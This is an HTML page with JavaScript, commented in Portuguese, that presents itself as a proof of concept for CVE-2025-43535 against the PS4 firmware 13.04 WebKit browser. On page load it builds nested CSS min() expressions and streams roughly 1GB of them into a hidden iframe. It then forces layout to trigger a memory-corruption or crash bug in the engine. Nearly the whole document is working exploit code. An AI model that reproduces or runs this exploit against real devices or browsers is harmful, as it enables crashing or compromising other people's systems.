<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>CVE-2025-43535 — Iframe Stream</title>
<style>
  body { background:#0a0a0a; color:#88ff88; font-family:monospace; padding:16px; }
  #log { background:#111; border:1px solid #88ff88; padding:12px; height:320px; overflow-y:auto; font-size:12px; }
  .ok{color:#00ff88} .fail{color:#ff4444} .warn{color:#ffbb00} .crash{color:#ff00ff;font-weight:bold}
</style>
</head>
<body>
<div>CVE-2025-43535 · PS4 FW 13.04 (GitHub Native)</div>
<div id="log"></div>

<iframe id="sandbox" style="position:absolute;top:-9999px;width:1px;height:1px;"></iframe>

<script>
"use strict";

const L = (m, c) => {
  const d = document.getElementById('log');
  d.innerHTML += `<div class="${c||'info'}">[${Date.now()%100000}] ${m}</div>`;
  d.scrollTop = d.scrollHeight;
};

// Constrói um bloco base (C22 = ~36MB). Isso é seguro para a RAM do JS.
function buildDepth(depth) {
  let e = '1px';
  for (let d = 1; d <= depth; d++) {
    e = 'min(' + e + ',' + e + ')';
  }
  return e;
}

async function run() {
  L('Iniciando Iframe Streaming...', 'warn');

  // 1. Gera o bloco base
  L('Construindo bloco C22 base no JS (~36MB)...', 'info');
  let c22;
  try {
    c22 = buildDepth(22);
    L(`Bloco C22 pronto. JS usando pouca RAM.`, 'ok');
  } catch(e) {
    L('Erro ao gerar C22: ' + e, 'fail');
    return;
  }

  L('Abrindo fluxo de escrita direta para o WebKit C++...', 'warn');
  
  // Pegamos o documento do iframe
  const iframe = document.getElementById('sandbox');
  const doc = iframe.contentDocument || iframe.contentWindow.document;
  
  doc.open();
  
  // Atalho para não escrever doc.write toda hora
  const w = (str) => doc.write(str);

  // Função para montar um C24 (144MB) juntando quatro C22 (36MB)
  // Mas jogando direto no C++, sem salvar no JS!
  function writeC24() {
    w('min(min('); w(c22); w(','); w(c22); w('),min('); w(c22); w(','); w(c22); w('))');
  }

  // 2. Injeta o CSS gigante (Exatos 1044MB do PoC Original)
  L('Transmitindo os chunks de 36MB para formar 1GB de CSS...', 'info');
  
  try {
    w('<style>.t{width:');
    
    // O Blob Original:
    w('min(');
      // Esquerda: 576MB / 67.1M nós
      w('min(');
        w('min('); writeC24(); w(','); writeC24(); w('),');
        w('min('); writeC24(); w(','); writeC24(); w(')');
      w('),');
      
      // Direita: 468MB / 54.5M nós
      w('min(');
        w('min('); writeC24(); w(','); writeC24(); w('),');
        w('min('); writeC24(); w(','); w(c22); w(')'); // <--- O último é um C22!
      w(')');
    w(')}');
    w('</style><div class="t" id="target"></div>');

    L('Transmissão concluída. 1GB entregue ao HTML Parser.', 'ok');
  } catch(e) {
    L('Erro durante o streaming: ' + e, 'fail');
    return;
  }

  // 3. Limpa o C22 do JavaScript para dar RAM ao WebKit
  L('Deletando chunk C22 do JS para liberar RAM...', 'warn');
  c22 = null;
  
  // Um tempinho pro Garbage Collector do JS limpar o chunk
  setTimeout(() => {
    L('Fechando documento para o CSS Parser engolir a árvore...', 'warn');
    
    // Isso engatilha o parser e constrói a árvore de milhões de nós
    doc.close();

    setTimeout(() => {
      L('Forçando layout para engatilhar o CVE...', 'crash');
      
      // Força o C++ a calcular a matemática absurda
      const target = doc.getElementById('target');
      try {
        void target.offsetWidth;
        L('Sobreviveu. O console precisaria de mais nós.', 'fail');
      } catch(e) {
        L('Falha no layout: ' + e, 'fail');
      }
      
    }, 150);
  }, 300);
}

window.addEventListener('load', () => setTimeout(run, 300));
</script>
</body>
</html>
